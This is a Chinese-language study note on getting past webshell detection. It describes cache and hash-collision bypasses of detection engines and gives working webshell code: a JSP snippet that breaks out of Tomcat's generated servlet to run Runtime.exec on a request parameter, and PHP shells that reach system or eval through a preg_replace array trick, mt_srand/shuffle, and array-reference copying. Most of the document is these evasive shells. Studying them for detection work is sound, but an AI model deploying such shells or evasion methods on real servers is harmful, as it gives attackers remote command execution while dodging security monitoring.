

# Webshell检测学习

## 1.缓存导致的绕过

起因：

	众所周知，现在的Webshell检测大部分都是多引擎，可能有静态分析、动态沙箱、机器学习之类的，特别是沙箱，其实是一个很消耗资源的东西。而HIDS部署在一些大公

司，可能有巨量的文件需要检测，这时候通常会有下面几个方法来缓解资源上的压力：

* 只检测特定后缀的文件
* 对于已经检测过的文件，缓存检测结果，下次不再检测
	思路：

	1.脚本类型的混淆，即根据分拣器将不同脚本类型的文件分给对应的脚本语言检测引擎来检测进行绕过。

	比如在1.jsp文件中写php的webshell,上传以后，检测引擎解析后发现jsp文件中没有java语言，于是将其判断为正常的webshell，并将其内容进行缓存。这样以后，下一次再次上传一个相同内容的1.php文件时，由于在缓存中检测到有完全相同hash值内容的文件，于是就直接让这个文件通过，不进行检测

	2.哈希碰撞

	利用hash碰撞找到一组文件名和文件内容哈希后hash值相同的文件，一个是完全正常的文件，一个是webshell，先上传正常的文件，让其存入到缓存中，再上传webshell达成绕过。

## 2.JSP解释流程导致

​      	在用户第一次请求JSP文件的时 候，Tomcat会先将JSP文件拼接成一个Java类的源文件（.java后缀），保存在临时目录下，接着再编译 这个源文件成字节码，最后放进JVM里运行。 借用文章里的一张图来说明这个过程，图1： 这个过程中可能存在问题的就是第一步，拼接/解析JSP的过程。 安全世界里有很多问题都是拼接导致的，比如SQL注入、命令注入等，这些漏洞之所以存在问题，就是 因为没有考虑到拼接时可能产生的“闭合”的问题。一旦拼接时对前面的内容进行了闭合，就可以逃逸出 上下文，进而执行一些非预期的操作。 

![image-20220919160952152](C:\Users\Lightstar\AppData\Roaming\Typora\typora-user-images\image-20220919160952152.png)


```plain
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    String data = request.getParameter("test");
    hack(data);
    } catch (java.lang.Throwable t) {} finally { _jspxFactory.releasePageContext(_jspx_page_context); }
    }
    public void hack(String data) throws java.io.IOException, javax.servlet.ServletException
    {
    javax.servlet.jsp.JspWriter out = null;
    javax.servlet.jsp.JspWriter _jspx_out = null;
    javax.servlet.jsp.PageContext _jspx_page_context = null;
    javax.servlet.http.HttpServletResponse response = null;
    try {
    Runtime.getRuntime().exec(data);
%>
```
![image-20220919160941216](C:\Users\Lightstar\AppData\Roaming\Typora\typora-user-images\image-20220919160941216.png)


 这样在jsp中看来，我的代码是有语法问题的，它 包含一个函数的下半部分，和另一个函数的上半部分；但这段代码拼接进Java源文件后，这两半部分都 分别正确闭合了，解析不会有问题。

## 3.正则exec

1. preg_replace 数组绕过

   ![image-20220919160906034](C:\Users\Lightstar\AppData\Roaming\Typora\typora-user-images\image-20220919160906034.png)


利用preg_replace检测参数可接受数组来进行绕过

```php
 原 preg_replace('/.*/e', '\0', $_REQUEST[2333]);
改后 preg_replace(['/.*/e'], '\0', $_REQUEST[2333]);
```
### 4. PHP函数利用

####  	1.mt_srand+shuffle

```php
<?php
$arr = array("t", "n1k0la", "webdxg", "system");
function shift(&$arr){
mt_srand($_GET[0]); //改变数组的key value对应
shuffle($arr);
}
shift($arr);
$arr[2]($_GET[1]); //动态函数执行
```

#### 2.引用赋值

​	于 PHP 内部工作的特殊性，如果对数组的单个元素进行引用，然后复制数组，无论是通过赋值还是通 过函数调用中的值传递，都会将引用复制为数组的一部分。这意味着对任一数组中任何此类元素的更改 都将在另一个数组（和其他引用中）中重复，即使数组具有不同的作用域（例如，一个是函数内部的参 数，另一个是全局的）！在复制时没有引用的元素，以及在复制数组后分配给其他元素的引用，将正常 工作（即独立于其他数组）。 

​	为了验证上面的说法，我们这里 xdebug_debug_zval 查看变量 a 和 c 的信息，可以看到 $a[0] 和 $c[0] 被标为了 is_ref ，也就是说它们是一个引用类型 为了更严谨一点，这里通过 gdb 对 PHP 进行调试，可以看到gdb中 $a[0] 和 $c[0] 也是被标为了 is_ref 并且都指向同一内存地址，这也就验证了为什么修改 c[0] 也会导致 a[0] 改变。

```php
<?php 
$a=array(1=>'A');
$b=&$a[1];
$c=$a;
$c[$_GET['num']]=$_GET['cmd'];
eval($a[1]);
?>
```



​	

